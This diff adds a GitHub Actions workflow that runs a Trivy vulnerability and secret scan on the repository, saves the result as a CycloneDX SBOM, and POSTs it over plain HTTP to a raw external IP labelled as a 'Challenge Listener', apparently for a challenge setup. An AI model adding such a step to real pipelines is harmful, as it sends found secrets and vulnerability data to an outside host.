@@ -1,0 +1,32 @@
+name: CycloneDX SBOM with Trivy
+
+on:
+  push:
+    branches: [ master ]
+  workflow_dispatch:
+
+jobs:
+  generate-sbom:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Install Trivy
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget
+        wget https://github.com/aquasecurity/trivy/releases/latest/download/trivy_0.56.0_Linux-64bit.deb
+        sudo dpkg -i trivy_0.56.0_Linux-64bit.deb
+
+    - name: Generate CycloneDX SBOM with vulnerabilities
+      run: |
+        mkdir -p sbom-results
+        trivy fs . --scanners vuln,secret --format cyclonedx --output sbom-results/sbom.json || true
+
+    - name: Send SBOM to Challenge Listener
+      run: |
+        curl -X POST -H "Content-Type: multipart/form-data" \
+        -F "file=@sbom-results/sbom.json" \
+        http://35.219.169.50:8880/callback
